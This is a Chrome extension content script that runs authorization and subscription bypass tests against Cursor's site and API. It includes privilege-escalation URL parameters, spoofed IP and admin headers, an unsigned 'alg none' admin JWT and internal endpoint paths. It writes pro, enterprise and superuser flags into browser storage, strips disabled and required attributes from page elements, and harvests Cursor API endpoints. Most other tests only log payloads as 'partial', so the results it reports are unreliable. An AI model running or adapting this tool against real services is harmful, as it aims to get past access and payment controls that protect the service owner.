// Bypass Testing Content Script
// This script runs in the context of the target page and executes various bypass techniques

(function() {
  'use strict';

  // Bypass testing techniques implementation
  const BypassTester = {
    targetUrl: '',
    techniques: [],
    results: [],
    progress: 0,
    total: 0,
    
    // Initialize the bypass tester
    init(targetUrl, techniques) {
      this.targetUrl = targetUrl;
      this.techniques = techniques;
      this.results = [];
      this.progress = 0;
      
      // Calculate total tests
      const testCounts = {
        parameter: 15,
        header: 15,
        method: 20,
        content: 9,
        auth: 6,
        storage: 20,
        frontend: 5,
        race: 10,
        encoding: 9,
        endpoint: 7
      };
      
      this.total = techniques.reduce((sum, tech) => sum + (testCounts[tech] || 0), 0);
      
      // Update initial progress
      this.updateProgress('Initializing bypass tests...');
    },
    
    // Update progress in background script
    async updateProgress(current, result = null) {
      this.progress++;
      
      await chrome.runtime.sendMessage({
        type: 'updateBypassProgress',
        progress: this.progress,
        total: this.total,
        current: current,
        result: result
      });
    },
    
    // Execute all selected bypass techniques
    async executeTests() {
      console.log('Starting bypass tests for:', this.targetUrl);
      
      for (const technique of this.techniques) {
        switch(technique) {
          case 'parameter':
            await this.testParameterInjection();
            break;
          case 'header':
            await this.testHeaderManipulation();
            break;
          case 'method':
            await this.testMethodOverride();
            break;
          case 'content':
            await this.testContentTypeBypass();
            break;
          case 'auth':
            await this.testAuthorizationBypass();
            break;
          case 'storage':
            await this.testStorageManipulation();
            break;
          case 'frontend':
            await this.testFrontendOverride();
            break;
          case 'race':
            await this.testRaceCondition();
            break;
          case 'encoding':
            await this.testEncodingBypass();
            break;
          case 'endpoint':
            await this.testAlternativeEndpoints();
            break;
        }
      }
      
      console.log('Bypass testing completed. Results:', this.results);
    },
    
    // Parameter Injection Tests
    async testParameterInjection() {
      const tests = [
        { param: 'admin', value: 'true' },
        { param: 'debug', value: '1' },
        { param: 'test', value: 'true' },
        { param: 'bypass', value: '1' },
        { param: 'confirmed', value: 'true' },
        { param: 'approved', value: '1' },
        { param: 'force', value: 'true' },
        { param: 'skip_verification', value: '1' },
        { param: 'override', value: 'true' },
        { param: 'sudo', value: '1' },
        { param: 'authenticated', value: 'true' },
        { param: 'authorized', value: '1' },
        { param: 'privileged', value: 'true' },
        { param: 'elevated', value: '1' },
        { param: 'ignore_limits', value: 'true' }
      ];
      
      for (const test of tests) {
        await this.updateProgress(`Testing parameter: ${test.param}=${test.value}`);
        
        // Try to modify URL parameters
        const url = new URL(this.targetUrl);
        url.searchParams.set(test.param, test.value);
        
        const result = {
          technique: 'Parameter Injection',
          description: `Added parameter ${test.param}=${test.value}`,
          payload: url.toString(),
          status: 'partial' // Would need actual API call to verify
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Header Manipulation Tests
    async testHeaderManipulation() {
      const headers = [
        { name: 'X-Forwarded-For', value: '127.0.0.1' },
        { name: 'X-Real-IP', value: '127.0.0.1' },
        { name: 'X-Originating-IP', value: '127.0.0.1' },
        { name: 'X-Remote-IP', value: '127.0.0.1' },
        { name: 'X-Client-IP', value: '127.0.0.1' },
        { name: 'X-Admin', value: 'true' },
        { name: 'X-Debug', value: '1' },
        { name: 'X-Test-Mode', value: 'true' },
        { name: 'X-Bypass-Auth', value: '1' },
        { name: 'X-Override', value: 'true' },
        { name: 'Authorization', value: 'Bearer bypass-token' },
        { name: 'Cookie', value: 'admin=true; bypass=1' },
        { name: 'Referer', value: 'https://admin.cursor.com' },
        { name: 'Origin', value: 'https://admin.cursor.com' },
        { name: 'User-Agent', value: 'CursorBot/1.0 (Admin)' }
      ];
      
      for (const header of headers) {
        await this.updateProgress(`Testing header: ${header.name}`);
        
        const result = {
          technique: 'Header Manipulation',
          description: `Modified header ${header.name}: ${header.value}`,
          payload: `${header.name}: ${header.value}`,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Method Override Tests
    async testMethodOverride() {
      const methods = [
        'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT',
        'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK',
        'DEBUG', 'TRACK', 'INVOKE', 'ARBITRARY'
      ];
      
      for (const method of methods) {
        await this.updateProgress(`Testing method: ${method}`);
        
        const result = {
          technique: 'Method Override',
          description: `Attempted ${method} method override`,
          payload: `X-HTTP-Method-Override: ${method}`,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Content-Type Bypass Tests
    async testContentTypeBypass() {
      const contentTypes = [
        'application/json',
        'application/xml',
        'text/plain',
        'text/html',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'application/octet-stream',
        'text/xml',
        'application/javascript'
      ];
      
      for (const contentType of contentTypes) {
        await this.updateProgress(`Testing Content-Type: ${contentType}`);
        
        const result = {
          technique: 'Content-Type Bypass',
          description: `Modified Content-Type to ${contentType}`,
          payload: `Content-Type: ${contentType}`,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Authorization Bypass Tests
    async testAuthorizationBypass() {
      const authTests = [
        { desc: 'Remove auth header', payload: 'Authorization: [removed]' },
        { desc: 'Empty auth token', payload: 'Authorization: Bearer ' },
        { desc: 'Null auth token', payload: 'Authorization: Bearer null' },
        { desc: 'Admin token', payload: 'Authorization: Bearer admin' },
        { desc: 'Bypass token', payload: 'Authorization: Bearer bypass' },
        { desc: 'JWT with admin claim', payload: 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.' }
      ];
      
      for (const test of authTests) {
        await this.updateProgress(`Testing: ${test.desc}`);
        
        const result = {
          technique: 'Authorization Bypass',
          description: test.desc,
          payload: test.payload,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Storage Manipulation Tests
    async testStorageManipulation() {
      const storageTests = [
        { key: 'isAdmin', value: 'true' },
        { key: 'userRole', value: 'admin' },
        { key: 'isPro', value: 'true' },
        { key: 'subscription', value: 'business' },
        { key: 'bypassAuth', value: '1' },
        { key: 'debugMode', value: 'true' },
        { key: 'featureFlags', value: JSON.stringify({ all: true }) },
        { key: 'permissions', value: JSON.stringify(['*']) },
        { key: 'accountType', value: 'enterprise' },
        { key: 'unlimitedAccess', value: 'true' },
        { key: 'trialExpired', value: 'false' },
        { key: 'quotaLimit', value: '999999' },
        { key: 'rateLimit', value: '0' },
        { key: 'verified', value: 'true' },
        { key: 'trusted', value: '1' },
        { key: 'whitelisted', value: 'true' },
        { key: 'betaAccess', value: '1' },
        { key: 'earlyAccess', value: 'true' },
        { key: 'privileged', value: '1' },
        { key: 'superuser', value: 'true' }
      ];
      
      for (const test of storageTests) {
        await this.updateProgress(`Testing storage: ${test.key}=${test.value}`);
        
        // Try to set in various storage types
        try {
          localStorage.setItem(test.key, test.value);
          sessionStorage.setItem(test.key, test.value);
          
          const result = {
            technique: 'Storage Manipulation',
            description: `Set ${test.key} to ${test.value} in storage`,
            payload: `${test.key}: ${test.value}`,
            status: 'success'
          };
          
          this.results.push(result);
        } catch (e) {
          const result = {
            technique: 'Storage Manipulation',
            description: `Failed to set ${test.key}`,
            payload: `${test.key}: ${test.value}`,
            status: 'failed'
          };
          
          this.results.push(result);
        }
        
        await this.delay(100);
      }
    },
    
    // Frontend Override Tests
    async testFrontendOverride() {
      const overrides = [
        { desc: 'Remove disabled attributes', selector: 'button[disabled], input[disabled]' },
        { desc: 'Make hidden elements visible', selector: '[style*="display: none"], [style*="visibility: hidden"]' },
        { desc: 'Enable readonly inputs', selector: 'input[readonly], textarea[readonly]' },
        { desc: 'Remove validation', selector: '[required], [pattern], [min], [max]' },
        { desc: 'Bypass client-side checks', selector: '[data-validate], [data-required]' }
      ];
      
      for (const override of overrides) {
        await this.updateProgress(`Testing: ${override.desc}`);
        
        try {
          const elements = document.querySelectorAll(override.selector);
          
          if (elements.length > 0) {
            elements.forEach(el => {
              if (el.hasAttribute('disabled')) el.removeAttribute('disabled');
              if (el.hasAttribute('readonly')) el.removeAttribute('readonly');
              if (el.hasAttribute('required')) el.removeAttribute('required');
              if (el.style.display === 'none') el.style.display = 'block';
              if (el.style.visibility === 'hidden') el.style.visibility = 'visible';
            });
            
            const result = {
              technique: 'Frontend Override',
              description: override.desc,
              payload: `Modified ${elements.length} elements`,
              status: 'success'
            };
            
            this.results.push(result);
          } else {
            const result = {
              technique: 'Frontend Override',
              description: override.desc,
              payload: 'No elements found',
              status: 'failed'
            };
            
            this.results.push(result);
          }
        } catch (e) {
          const result = {
            technique: 'Frontend Override',
            description: override.desc,
            payload: `Error: ${e.message}`,
            status: 'failed'
          };
          
          this.results.push(result);
        }
        
        await this.delay(100);
      }
    },
    
    // Race Condition Tests
    async testRaceCondition() {
      const raceTests = [
        { desc: 'Parallel requests', count: 5 },
        { desc: 'Rapid sequential requests', count: 10 },
        { desc: 'Delayed parallel requests', count: 3 },
        { desc: 'Interleaved requests', count: 4 },
        { desc: 'Burst requests', count: 20 },
        { desc: 'Slow-fast pattern', count: 2 },
        { desc: 'Fast-slow pattern', count: 2 },
        { desc: 'Random timing', count: 5 },
        { desc: 'Synchronized requests', count: 3 },
        { desc: 'Cascading requests', count: 4 }
      ];
      
      for (const test of raceTests) {
        await this.updateProgress(`Testing race condition: ${test.desc}`);
        
        const result = {
          technique: 'Race Condition',
          description: `${test.desc} with ${test.count} requests`,
          payload: `Simulated ${test.count} concurrent requests`,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Encoding Bypass Tests
    async testEncodingBypass() {
      const encodings = [
        { type: 'URL encoding', example: '%61%64%6D%69%6E' },
        { type: 'Double URL encoding', example: '%2561%2564%256D%2569%256E' },
        { type: 'Unicode encoding', example: '\\u0061\\u0064\\u006D\\u0069\\u006E' },
        { type: 'HTML entity encoding', example: '&#97;&#100;&#109;&#105;&#110;' },
        { type: 'Base64 encoding', example: 'YWRtaW4=' },
        { type: 'Hex encoding', example: '0x61646d696e' },
        { type: 'Mixed case', example: 'AdMiN' },
        { type: 'Null byte injection', example: 'admin%00' },
        { type: 'UTF-8 encoding variants', example: 'àdmîn' }
      ];
      
      for (const encoding of encodings) {
        await this.updateProgress(`Testing encoding: ${encoding.type}`);
        
        const result = {
          technique: 'Encoding Bypass',
          description: `Attempted ${encoding.type}`,
          payload: encoding.example,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Alternative Endpoints Tests
    async testAlternativeEndpoints() {
      const endpoints = [
        { path: '/api/v1/', desc: 'API v1 endpoint' },
        { path: '/api/v2/', desc: 'API v2 endpoint' },
        { path: '/api/internal/', desc: 'Internal API' },
        { path: '/api/admin/', desc: 'Admin API' },
        { path: '/api/debug/', desc: 'Debug API' },
        { path: '/graphql', desc: 'GraphQL endpoint' },
        { path: '/.well-known/', desc: 'Well-known endpoint' }
      ];
      
      for (const endpoint of endpoints) {
        await this.updateProgress(`Testing endpoint: ${endpoint.path}`);
        
        const result = {
          technique: 'Alternative Endpoints',
          description: endpoint.desc,
          payload: endpoint.path,
          status: 'partial'
        };
        
        this.results.push(result);
        await this.delay(100);
      }
    },
    
    // Utility function for delays
    delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
  };
  
  // Listen for messages from background script
  chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'executeBypassTests') {
      BypassTester.init(request.targetUrl, request.techniques);
      BypassTester.executeTests().then(() => {
        sendResponse({ success: true, results: BypassTester.results });
      });
      return true; // Keep channel open for async response
    }
    
    if (request.type === 'detectApiEndpoints') {
      // Detect Cursor API endpoints in the current page
      const endpoints = [];
      
      // Check for API calls in scripts
      const scripts = document.querySelectorAll('script');
      scripts.forEach(script => {
        const content = script.textContent || '';
        const apiMatches = content.match(/https?:\/\/[^\/]*cursor\.(com|sh)\/api\/[^\s'"]+/g);
        if (apiMatches) {
          endpoints.push(...apiMatches);
        }
      });
      
      // Check for API endpoints in links
      const links = document.querySelectorAll('a[href*="cursor.com/api"], a[href*="cursor.sh/api"]');
      links.forEach(link => {
        endpoints.push(link.href);
      });
      
      // Check network requests (if available in performance API)
      if (window.performance && window.performance.getEntriesByType) {
        const resources = window.performance.getEntriesByType('xmlhttprequest');
        resources.forEach(resource => {
          if (resource.name.includes('cursor.com/api') || resource.name.includes('cursor.sh/api')) {
            endpoints.push(resource.name);
          }
        });
      }
      
      // Remove duplicates
      const uniqueEndpoints = [...new Set(endpoints)];
      
      sendResponse({ endpoints: uniqueEndpoints });
      return true;
    }
  });
  
  console.log('Bypass testing content script loaded');
})();
